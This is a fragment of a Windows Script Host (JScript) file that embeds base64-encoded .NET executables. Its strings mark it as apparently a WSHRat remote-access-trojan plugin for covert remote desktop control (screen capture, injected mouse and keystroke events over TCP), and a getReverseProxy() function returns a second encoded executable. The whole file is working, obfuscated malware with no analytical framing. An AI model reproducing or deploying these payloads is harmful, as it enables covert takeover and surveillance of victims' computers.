ZQBDb21wcmVzc0pQRUcAaW1nAHJhdGlvAFN5c3RlbS5EcmF3aW5nLkltYWdpbmcASW1hZ2VDb2RlY0luZm8AR2V0SnBlZ0NvZGVjSW5mbwBFbnVtAHZhbHVlX18AUHJvY2Vzc0RQSVVuYXdhcmUAUHJvY2Vzc1N5c3RlbURQSUF3YXJlAFByb2Nlc3NQZXJNb25pdG9yRFBJQXdhcmUAU3lzdGVtLk5ldC5Tb2NrZXRzAFRjcENsaWVudABzb2NrZXQAZ2gAbG9vcGluZwBtYWluAGFyZ3MAUG9zdEdyYXBoaWNzAE1PVVNFRVZFTlRGX0FCU09MVVRFAE1PVVNFRVZFTlRGX0xFRlRET1dOAE1PVVNFRVZFTlRGX0xFRlRVUABNT1VTRUVWRU5URl9SSUdIVERPV04ATU9VU0VFVkVOVEZfUklHSFRVUABNT1VTRUVWRU5URl9NSURETEVET1dOAE1PVVNFRVZFTlRGX01JRERMRVVQAE1PVVNFRVZFTlRGX1dIRUVMAG1vdXNlX2V2ZW50AGR3RmxhZ3MAZHgAZHkAY0J1dHRvbnMAZHdFeHRyYUluZm8AdXNlcjMyAENsaWNrAE5CdXR0b24ARGJsQ2xpY2sATW91c2VEb3duAE1vdXNlVXAATW92ZVRvAFgAWQBNb3VzZVdoZWVsAERlbHRhAFN5c3RlbS5SZXNvdXJjZXMAUmVzb3VyY2VNYW5hZ2VyAHJlc291cmNlTWFuAFN5c3RlbS5HbG9iYWxpemF0aW9uAEN1bHR1cmVJbmZvAHJlc291cmNlQ3VsdHVyZQBnZXRfUmVzb3VyY2VNYW5hZ2VyAGdldF9DdWx0dXJlAHNldF9DdWx0dXJlAFZhbHVlAEN1bHR1cmUAU3lzdGVtLkNvbmZpZ3VyYXRpb24AQXBwbGljYXRpb25TZXR0aW5nc0Jhc2UAZGVmYXVsdEluc3RhbmNlAGdldF9EZWZhdWx0AERlZmF1bHQAZ2V0X1NldHRpbmdzAFNldHRpbmdzAFN5c3RlbS5Db21wb25lbnRNb2RlbABFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUARWRpdG9yQnJvd3NhYmxlU3RhdGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25vc3RpY3MARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBEZWJ1Z2dlckhpZGRlbkF0dHJpYnV0ZQBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQ29tcGlsZXJTZXJ2aWNlcwBTdGFuZGFyZE1vZHVsZUF0dHJpYnV0ZQBIaWRlTW9kdWxlTmFtZUF0dHJpYnV0ZQBTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduAEhlbHBLZXl3b3JkQXR0cmlidXRlAFN5c3RlbS5SZWZsZWN0aW9uAFRhcmdldEludm9jYXRpb25FeGNlcHRpb24AQ29udHJvbABnZXRfSXNEaXNwb3NlZABSdW50aW1lVHlwZUhhbmRsZQBHZXRUeXBlRnJvbUhhbmRsZQBDb250YWluc0tleQBTdHJpbmcAVXRpbHMAR2V0UmVzb3VyY2VTdHJpbmcASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBBZGQAQWN0aXZhdG9yAENyZWF0ZUluc3RhbmNlAFByb2plY3REYXRhAEV4Y2VwdGlvbgBTZXRQcm9qZWN0RXJyb3IAZ2V0X0lubmVyRXhjZXB0aW9uAGdldF9NZXNzYWdlAENsZWFyUHJvamVjdEVycm9yAFJlbW92ZQBDb21wb25lbnQARGlzcG9zZQBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAFJ1bnRpbWVIZWxwZXJzAEdldE9iamVjdFZhbHVlAE15R3JvdXBDb2xsZWN0aW9uQXR0cmlidXRlAFRocmVhZFN0YXRpY0F0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBFbnZpcm9ubWVudABPcGVyYXRpbmdTeXN0ZW0AZ2V0X09TVmVyc2lvbgBWZXJzaW9uAGdldF9WZXJzaW9uAGdldF9NYWpvcgBSZWN0YW5nbGUAU2NyZWVuAGdldF9TY3JlZW4AZ2V0X0JvdW5kcwBnZXRfV2lkdGgAQ29udmVyc2lvbnMAZ2V0X0hlaWdodABDb25jYXQAR3JhcGhpY3MAU3lzdGVtLklPAE1lbW9yeVN0cmVhbQBQaXhlbEZvcm1hdABGcm9tSW1hZ2UAU2l6ZQBnZXRfU2l6ZQBDb3B5UGl4ZWxPcGVyYXRpb24AQ29weUZyb21TY3JlZW4ATWF0aABSb3VuZABEcmF3SW1hZ2UASW1hZ2VGb3JtYXQAZ2V0X1BuZwBTdHJlYW0AU2F2ZQBUb0FycmF5AEVuY29kZXJQYXJhbWV0ZXJzAEVuY29kZXJQYXJhbWV0ZXIAZ2V0X1BhcmFtAEVuY29kZXIAUXVhbGl0eQBGcm9tU3RyZWFtAEdldEltYWdlRW5jb2RlcnMAZ2V0X01pbWVUeXBlAE9wZXJhdG9ycwBDb21wYXJlU3RyaW5nAERsbEltcG9ydEF0dHJpYnV0ZQBzaGNvcmUuZGxsAF9MYW1iZGEkX18xAGEwAERlYnVnZ2VyU3RlcFRocm91Z2hBdHRyaWJ1dGUAU3lzdGVtLlRocmVhZGluZwBUaHJlYWQAVG9JbnRlZ2VyAENvbm5lY3QAU3lzdGVtLlRleHQARW5jb2RpbmcAZ2V0X0FTQ0lJAEdldEJ5dGVzAE5ldHdvcmtTdHJlYW0AR2V0U3RyZWFtAFdyaXRlAEZsdXNoAEJ5dGUAUmVhZABDbG9zZQBFeGl0AEdldFN0cmluZwBFbmRzV2l0aABJbmRleE9mAFN1YnN0cmluZwBDaGFyAFNwbGl0AFBhcmFtZXRlcml6ZWRUaHJlYWRTdGFydABJbnQzMgBTdGFydABTZW5kS2V5cwBTZW5kV2FpdABSdW4AU2xlZXAAU1RBVGhyZWFkQXR0cmlidXRlAFBvaW50AEN1cnNvcgBzZXRfUG9zaXRpb24AUmVmZXJlbmNlRXF1YWxzAEFzc2VtYmx5AGdldF9Bc3NlbWJseQBTZXR0aW5nc0Jhc2UAU3luY2hyb25pemVkAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5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AAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAAAIAAAEAMAAwADAAMAAwADQAYgAwAAAAPAAOAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABXAFMASABSAGEAdAAgAFAAbAB1AGcAaQBuAAAANAAGAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAHIAZABwAGwAdQAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADEALgAwAC4AMAAAADAACAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAUgBEAFAALgBlAHgAZQAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADEAOQAAADgACAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABSAEQAUAAuAGUAeABlAAAALAAGAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAAByAGQAcABsAHUAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMQAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAxAC4AMAAuADAAAAAAAAAAKAAAACAAAABAAAAAAQAEAAAAAACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHd3d3d3d3d3d3d3d3d3cARERERERERERERERERERHAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAEiIiIiIiIiIiIiIiIiIRwBEREREREREREREREREREcARMTExMTExMTExOzs5JdHAEzMzMzMzMzMzMzMzMzMQAAERERERERERERERERERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/////////////////////AAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAPAAAAH////////////////KAAAABAAAAAgAAAAAQAEAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAd3d3d3d3d3REREREREREdP///////4R0////////hHT///////+EdP///////4R0////////hHT///////+EdP///////4R0////////hHSIiIiIiIiEdMzMzMzMzMR8RERERERETAAAAAAAAAAAAAAAAAAAAAAP//AACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA//8AAP//AAAAAAEAAgAgIBAAAQAEAOgCAAACABAQEAABAAQAKAEAAAMAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxhc212MTphc3NlbWJseSBtYW5pZmVzdFZlcnNpb249IjEuMCIgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiB4bWxuczphc212MT0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIHhtbG5zOmFzbXYyPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8IS0tIFVBQyBNYW5pZmVzdCBPcHRpb25zDQogICAgICAgICAgICBJZiB5b3Ugd2FudCB0byBjaGFuZ2UgdGhlIFdpbmRvd3MgVXNlciBBY2NvdW50IENvbnRyb2wgbGV2ZWwgcmVwbGFjZSB0aGUgDQogICAgICAgICAgICByZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBub2RlIHdpdGggb25lIG9mIHRoZSBmb2xsb3dpbmcuDQoNCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsICBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCAgbGV2ZWw9InJlcXVpcmVBZG1pbmlzdHJhdG9yIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCAgbGV2ZWw9ImhpZ2hlc3RBdmFpbGFibGUiIHVpQWNjZXNzPSJmYWxzZSIgLz4NCg0KICAgICAgICAgICAgU3BlY2lmeWluZyByZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBub2RlIHdpbGwgZGlzYWJsZSBmaWxlIGFuZCByZWdpc3RyeSB2aXJ0dWFsaXphdGlvbi4NCiAgICAgICAgICAgIElmIHlvdSB3YW50IHRvIHV0aWxpemUgRmlsZSBhbmQgUmVnaXN0cnkgVmlydHVhbGl6YXRpb24gZm9yIGJhY2t3YXJkIA0KICAgICAgICAgICAgY29tcGF0aWJpbGl0eSB0aGVuIGRlbGV0ZSB0aGUgcmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbm9kZS4NCiAgICAgICAgLS0+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQogIA0KICA8Y29tcGF0aWJpbGl0eSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpjb21wYXRpYmlsaXR5LnYxIj4NCiAgICA8YXBwbGljYXRpb24+DQogICAgICA8IS0tIEEgbGlzdCBvZiBhbGwgV2luZG93cyB2ZXJzaW9ucyB0aGF0IHRoaXMgYXBwbGljYXRpb24gaXMgZGVzaWduZWQgdG8gd29yayB3aXRoLiBXaW5kb3dzIHdpbGwgYXV0b21hdGljYWxseSBzZWxlY3QgdGhlIG1vc3QgY29tcGF0aWJsZSBlbnZpcm9ubWVudC4tLT4NCg0KICAgICAgPCEtLSBJZiB5b3VyIGFwcGxpY2F0aW9uIGlzIGRlc2lnbmVkIHRvIHdvcmsgd2l0aCBXaW5kb3dzIDcsIHVuY29tbWVudCB0aGUgZm9sbG93aW5nIHN1cHBvcnRlZE9TIG5vZGUtLT4NCiAgICAgIDwhLS08c3VwcG9ydGVkT1MgSWQ9InszNTEzOGI5YS01ZDk2LTRmYmQtOGUyZC1hMjQ0MDIyNWY5M2F9Ii8+LS0+DQogICAgICANCiAgICA8L2FwcGxpY2F0aW9uPg0KICA8L2NvbXBhdGliaWxpdHk+DQogIA0KICA8IS0tIEVuYWJsZSB0aGVtZXMgZm9yIFdpbmRvd3MgY29tbW9uIGNvbnRyb2xzIGFuZCBkaWFsb2dzIChXaW5kb3dzIFhQIGFuZCBsYXRlcikgLS0+DQogIDwhLS0gPGRlcGVuZGVuY3k+DQogICAgPGRlcGVuZGVudEFzc2VtYmx5Pg0KICAgICAgPGFzc2VtYmx5SWRlbnRpdHkNCiAgICAgICAgICB0eXBlPSJ3aW4zMiINCiAgICAgICAgICBuYW1lPSJNaWNyb3NvZnQuV2luZG93cy5Db21tb24tQ29udHJvbHMiDQogICAgICAgICAgdmVyc2lvbj0iNi4wLjAuMCINCiAgICAgICAgICBwcm9jZXNzb3JBcmNoaXRlY3R1cmU9IioiDQogICAgICAgICAgcHVibGljS2V5VG9rZW49IjY1OTViNjQxNDRjY2YxZGYiDQogICAgICAgICAgbGFuZ3VhZ2U9IioiDQogICAgICAgIC8+DQogICAgPC9kZXBlbmRlbnRBc3NlbWJseT4NCiAgPC9kZXBlbmRlbmN5Pi0tPg0KDQo8L2FzbXYxOmFzc2VtYmx5Pg0KDQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAMAAAA4DIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	var spike = (WScript.CreateObject("Microsoft.XMLDOM")).createElement("tmp");
	spike.dataType = "bin.base64";
	spike.text = encoded;
	return spike.nodeTypedValue;
}

function getReverseProxy(){
	var encoded = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEEAA7fSl0AAAAAAAAAAOAAAgELAQsAADQAAAAQAAAAAAAArlIAAAAgAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAADAAAAABAAAAAAAAAIAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAGBSAABLAAAAAIAAAKgKAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAwAAAAAYAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAtDIAAAAgAAAANAAAAAQAAAAAAAAAAAAAAAAAACAAAGAuc2RhdGEAAKQAAAAAYAAAAAIAAAA4AAAAAAAAAAAAAAAAAABAAADALnJzcmMAAACoCgAAAIAAAAAMAAAAOgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAACgAAAAAgAAAEYAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA